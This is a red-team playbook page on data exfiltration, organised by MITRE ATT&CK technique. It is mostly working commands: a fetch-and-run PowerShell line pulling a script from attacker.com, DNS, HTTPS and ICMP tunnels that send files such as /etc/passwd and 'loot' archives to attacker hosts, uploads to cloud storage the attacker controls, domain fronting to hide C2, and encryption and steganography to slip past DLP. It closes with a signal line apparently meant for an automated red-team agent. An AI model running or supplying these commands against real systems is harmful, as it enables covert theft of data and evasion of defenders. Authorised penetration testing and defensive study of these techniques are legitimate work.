# RT11: Data Exfiltration

**MITRE:** T1048, T1048.001, T1048.003, T1567, T1029 | **When:** Data/loot identified - need covert egress.

## DNS Exfiltration (T1048.003) - Egress almost always allowed

```bash
# dnscat2 (encrypted C2 + exfil over DNS):
# Server (attacker):
ruby dnscat2.rb --dns "domain=exfil.attacker.com,host=0.0.0.0" --no-cache

# Client (victim - PowerShell):
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/dnscat2.ps1')
Start-Dnscat2 -Domain exfil.attacker.com -DNSServer <ATTACKER_IP>

# Manual DNS exfil (base64 chunks as subdomains):
# Split file into 63-char base64 chunks, send as DNS queries:
for chunk in $(cat /etc/passwd | base64 | fold -w63); do
  nslookup "$chunk.exfil.attacker.com" <ATTACKER_NS>
done

# Receive with tcpdump/wireshark on attacker NS:
tcpdump -i eth0 -l udp port 53 | grep "exfil.attacker.com"

# Tool: iodine (tunnel IP over DNS), dns2tcp
iodine -f -P password attacker.com <ATTACKER_IP>  # creates tunnel interface
```

## HTTPS Beaconing Exfil (T1048)

```bash
# Chunk file + POST to HTTPS server:
split -b 50k /tmp/loot.tar.gz /tmp/chunk_
for f in /tmp/chunk_*; do
  curl -sk -X POST "https://attacker.com/upload" -H "Content-Type: application/octet-stream" \
    -H "X-Filename: $(basename $f)" --data-binary @"$f"
done

# Via PowerShell:
$bytes = [IO.File]::ReadAllBytes("C:\Windows\Temp\loot.zip")
$b64 = [Convert]::ToBase64String($bytes)
Invoke-RestMethod -Uri "https://attacker.com/upload" -Method POST -Body $b64 -ContentType "text/plain"

# Cobalt Strike: execute-assembly SharpExfil or use artifact kit for covert upload
```

## Cloud Storage Staging (T1567.002)

```bash
# AWS S3 (if target has AWS creds):
aws s3 cp /tmp/loot.tar.gz s3://attacker-controlled-bucket/loot/

# Azure Blob:
az storage blob upload --container-name loot --file /tmp/dump.zip --name dump.zip \
  --connection-string "DefaultEndpointsProtocol=https;AccountName=...;AccountKey=..."

# Dropbox API:
curl -X POST https://content.dropboxapi.com/2/files/upload \
  -H "Authorization: Bearer <DROPBOX_TOKEN>" \
  -H "Dropbox-API-Arg: {\"path\": \"/loot.zip\",\"mode\": \"add\"}" \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/loot.zip

# Google Drive API (if OAuth token available from phish):
curl -X POST "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" \
  -H "Authorization: Bearer <TOKEN>" ...
```

## Domain Fronting for Exfil (T1090.004)

```bash
# Route exfil through CDN to hide C2 destination:
# Cobalt Strike: HTTPS listener with malleable C2 profile using CDN front domain
# Host header: real C2 server (backend)
# SNI/DNS: CDN domain (appears in network logs)

# Example nginx redirector (sits at CDN edge):
# location /updates { proxy_pass https://real-c2.attacker.com; }

# In practice: Azure CDN, Cloudflare, Fastly, AWS CloudFront fronting
# Target org logs only see CDN IP in DNS/flow data
```

## ICMP/Protocol Tunneling (T1095)

```bash
# ICMP tunnel (when only ping egress):
# ptunnel-ng: TCP over ICMP
ptunnel-ng -p <ATTACKER_IP> -lp 8080 -da <INTERNAL_HOST> -dp 22  # client
ptunnel-ng  # server on attacker (listens for ICMP)

# ICMPsh (PowerShell victim, python attacker):
python icmpsh_m.py <ATTACKER_IP> <VICTIM_IP>
# Victim: .\icmpsh.exe -t <ATTACKER_IP> -d 500 -b 30 -s 128

# PowerShell ICMP exfil (manual):
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secret.txt"))
# Send in ICMP payload chunks via raw socket / ping -p flag (Linux only)
```

## Encrypted Archive + Steganography

```bash
# Encrypt before exfil to avoid DLP detection:
# 7zip AES-256:
7z a -p"secret" -mhe=on loot.7z /tmp/loot/

# OpenSSL encrypt:
openssl enc -aes-256-cbc -salt -in loot.tar.gz -out loot.enc -k "password"

# Steganography (hide in image - avoids DLP scanning):
steghide embed -cf innocent.jpg -sf loot.txt -p "password"
# Exfil innocent.jpg via normal HTTP/email
# Extract: steghide extract -sf innocent.jpg -p "password"
```

**Signal:** `emit_signal VULN_CONFIRMED "Exfil confirmed: <bytes> via <method> to <destination>" "main/redteam" 0.90`
